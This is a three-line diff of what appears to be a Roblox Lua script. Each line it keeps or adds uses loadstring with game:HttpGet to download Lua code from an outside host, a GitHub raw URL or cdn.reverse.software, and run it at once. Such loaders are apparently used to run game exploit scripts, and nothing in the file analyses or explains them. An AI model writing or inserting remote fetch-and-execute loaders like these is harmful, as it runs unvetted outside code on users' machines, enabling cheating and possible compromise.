@@ -1,2 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AWSHUB6/LUA/refs/heads/main/LUA"))()
 loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AWSHUB6/LUA/refs/heads/main/LUA"))()
+
